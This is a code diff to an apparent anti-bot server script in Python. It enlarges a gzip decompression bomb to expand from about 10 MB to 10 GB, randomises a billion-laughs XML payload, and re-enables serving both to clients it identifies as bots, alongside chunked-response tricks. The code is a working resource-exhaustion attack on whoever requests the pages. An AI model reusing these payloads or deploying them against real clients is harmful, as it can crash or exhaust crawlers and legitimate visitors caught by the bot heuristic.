@@ -33,7 +33,7 @@ def billionLaughs(prefix):
 
 a = array('u')
 dorp(a)
-billionLaughs = billionLaughs(a.tostring()).encode('utf-8')
+billionLaughs = billionLaughs(random.sample('lolzaoeuwhatatweest',4)).encode('utf-8')
 del a
 
 def zipbomb(prefix):
@@ -41,7 +41,7 @@ def zipbomb(prefix):
         with open(oj(filedb.top,'bomb.gz.bad'),'rb') as inp:
             return inp.read()
     except IOError: pass
-    stuff = bytes([0])*1000000
+    stuff = bytes([0])*10000000
     with replacerFile('bomb.gz.bad') as out:
         g = gzip.GzipFile(mode='w',fileobj=out)
         g.write(prefix)
@@ -49,8 +49,8 @@ def zipbomb(prefix):
             print('stripe',i)
             g.write(stuff)
         g.close()
-    # should end up 0.1mb -> 1 gigabyte
-#zipbomb = zipbomb(billionLaughs) meh, doesn't bother the bot.
+    # should end up 10mb -> 10 gigabyte
+zipbomb = zipbomb(billionLaughs) #meh, doesn't bother the bot.
 
 def generateBody(a):
     # arrayifying this shaves off a whole 3ms :p
@@ -72,10 +72,24 @@ def generateBody(a):
         a.extend('</a>\n')
     a.extend('</p></body></html>')
 
+class HeadWithBody:
+    dead = False
+    def __init__(self,b):
+        self.b = memoryview(b)
+        self.len = len(b)
+    def lose(self):
+        self.dead = True
+        self.b = None
+    def get(self,s,e):
+        if self.dead or s > self.len:
+            return None
+        return self.b[s:e]
+    
 def thingy(name,head,body):
     return (name,head + b'0\r\n\r\n',
-            head + str(len(body)).encode() + b'\r\n\r\n' + \
-            body)
+            HeadWithBody(
+                head + str(len(body)).encode() + b'\r\n\r\n' + \
+                body))
 
 def zbgen(date):
     body = zipbomb
@@ -111,16 +125,18 @@ def genbillionLaughs(date):
         b'Server: Apache',
         b'Content-Length: '
     )),billionLaughs)
-    
+
 class BotHelper:
     lastBot = None
-    messages = None
+    messages = ()
     def select(self,date,ip):
         if self.lastBot is None or time.time() - self.lastBot < 100:
+            for message in self.messages:
+                message[1].lose() # delayed senders can now give up here
             self.messages = [dorpgen(date) for i in range(0x20)]
             # self.messages = []
-            # self.messages.append(genbillionLaughs(date))
-            # self.messages.append(zbgen(date))
+            self.messages.append(genbillionLaughs(date))
+            self.messages.append(zbgen(date))
             self.lastBot = time.time()
         return random.sample(self.messages,1)[0]
 
